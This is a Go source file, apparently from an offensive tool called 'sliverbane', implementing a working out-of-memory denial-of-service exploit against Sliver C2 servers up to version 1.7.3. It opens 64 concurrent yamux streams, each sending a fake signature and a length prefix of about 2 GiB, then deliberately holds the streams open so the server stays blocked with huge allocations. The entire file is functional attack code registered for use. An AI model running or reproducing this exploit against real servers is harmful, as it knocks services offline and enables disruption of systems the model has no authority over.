package dos

import (
	"encoding/binary"
	"fmt"
	"sliverbane/internal/protocol"
	"sync"
	"time"

	"github.com/hashicorp/yamux"
)

// OOMAttack implements the Length-Prefix Abuse DoS
type OOMAttack struct{}

func (o *OOMAttack) Name() string {
	return "mtls-oom"
}

func (o *OOMAttack) Description() string {
	return "Sliver OOM via Length-Prefix Abuse (Patched in v1.7.4, vulnerability exists in <= v1.7.3)"
}

const (
	// ServerMaxMessageSize from server/c2/mtls.go:55 (~2 GiB)
	ServerMaxMessageSize = (2 * 1024 * 1024 * 1024) - 1
	// NumStreams triggers multiple large allocations (64 x 2 GiB = 128 GiB target)
	NumStreams = 64
)

func (o *OOMAttack) Execute(session *yamux.Session, envKey *protocol.EnvelopeKey) error {
	fakeSig := make([]byte, protocol.RawSigSize)
	lengthBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lengthBuf, uint32(ServerMaxMessageSize))

	fmt.Printf("[*] Opening %d concurrent yamux streams to trigger ~%d GiB allocation on server...\n", NumStreams, NumStreams*2)

	var wg sync.WaitGroup
	for i := 0; i < NumStreams; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			stream, err := session.Open()
			if err != nil {
				return
			}
			// Note: We do NOT close the stream to keep the memory allocated on the server

			// Step 1: Send fake signature (74 bytes)
			if _, err := stream.Write(fakeSig); err != nil {
				return
			}

			// Step 2: Send length prefix (requesting ~2 GiB allocation)
			if _, err := stream.Write(lengthBuf); err != nil {
				return
			}

			// Step 3: Stop here and don't send data.
			// The server is now blocked in io.ReadFull() holding the 2GiB buffer.
		}(i)
		time.Sleep(20 * time.Millisecond)
	}

	wg.Wait()
	fmt.Println("[+] Attack streams initialized. Sliver server should be under extreme memory pressure.")
	fmt.Println("[*] Holding connections open... (Press Ctrl+C to terminate the attack)")

	// Block indefinitely to maintain the allocations
	select {}
}

func init() {
	Register(&OOMAttack{})
}
